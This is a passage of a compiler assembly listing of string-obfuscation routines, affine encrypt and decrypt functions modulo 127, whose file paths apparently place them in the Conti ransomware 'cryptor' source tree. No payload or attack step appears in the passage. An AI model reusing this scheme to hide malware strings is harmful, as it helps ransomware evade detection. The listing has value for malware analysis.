  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 15	 add	 r8d, 21
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 0c 00 00 00	 mov	 ecx, 12
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0c	 add	 r8d, 12
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 73	 sub	 eax, 115		; 00000073H
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 73	 add	 r8d, 115		; 00000073H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 24 00 00 00	 mov	 ecx, 36			; 00000024H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 13	 imul	 r8d, eax, 19
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 24	 add	 r8d, 36			; 00000024H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 6f 00 00 00	 mov	 ecx, 111		; 0000006fH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6f	 add	 r8d, 111		; 0000006fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 2e 00 00 00	 mov	 ecx, 46			; 0000002eH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2e	 add	 r8d, 46			; 0000002eH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

